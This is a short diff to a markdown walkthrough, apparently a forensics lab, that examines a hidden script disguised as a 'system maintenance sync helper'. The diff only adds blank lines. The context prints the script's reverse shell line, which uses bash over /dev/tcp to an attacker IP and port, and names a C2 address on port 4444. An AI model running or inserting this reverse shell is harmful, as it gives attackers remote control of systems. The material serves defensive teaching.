@@ -92,6 +92,7 @@ Follow these sequential steps in the interactive Marimo notebook or in your term
    - Note the file path: `/opt/cert-tools/.sync.sh`.
    - The dot prefix (`.sync.sh`) hides the file from standard `ls` commands unless `-a` is passed.
 2. **Inspect the Script Content**:
+
    ```bash
    #!/bin/bash
    # System maintenance sync helper
@@ -101,6 +102,7 @@ Follow these sequential steps in the interactive Marimo notebook or in your term
 
    bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1
    ```
+
 3. **Payload Analysis**:
    - **Reverse Shell Mechanism**: Spawns an interactive bash shell (`bash -i`) redirected over a raw TCP socket (`>& /dev/tcp/... 0>&1`).
    - **C2 Destination**: `198.51.100.77` on port `4444`.
